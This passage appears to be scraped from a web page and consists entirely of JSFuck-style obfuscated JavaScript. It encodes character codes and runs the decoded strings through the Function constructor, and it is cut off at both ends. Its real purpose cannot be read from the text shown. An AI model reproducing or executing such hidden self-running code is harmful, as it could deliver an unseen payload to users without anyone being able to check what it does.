!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(+[]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(!![]+!![]+[])+(!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(+[]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(+[]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+[]),(+!![]+[])+(!![]+!![]+[])+(!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(+[]+[]),(!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+[]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+[]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+[]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(+!![]+[])+(+[]+[])+(+[]+[]),(+!![]+[])+(+[]+[])+(+[]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(!![]+!![]+[])+(!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(+[]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(!![]+!![]+[])+(!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(+[]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(+!![]+[]),(+!![]+[])+(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+[])))()+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]]+([][[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(&#123;&#125;)[+[]]+(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]))+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(+(+!![]+(!![]+[])[!![]+!![]+!![]]+(+!![])+(+[])+(+[])+(+[]))+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(![]+[])[+[]]+([]+[])[(![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]()[(+!![]+[])+(!![]+!![])]+([]+[])[(![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]()[(+!![]+[])+(!![]+!![])])()[!![]+!![]+!![]+!![]+!![]])()[(![]+[])[+[]]+(!![]+[])[+!![]]+(&#123;&#125;+[])[+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(+(+!![]+(!![]+[])[!![]+!![]+!![]]+(+!![])+(+[])+(+[])+(+[]))+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(![]+[])[+[]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(+[]+[]))()[!![]+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()((+!![]+[])[(![]+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]]]())[!![]+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!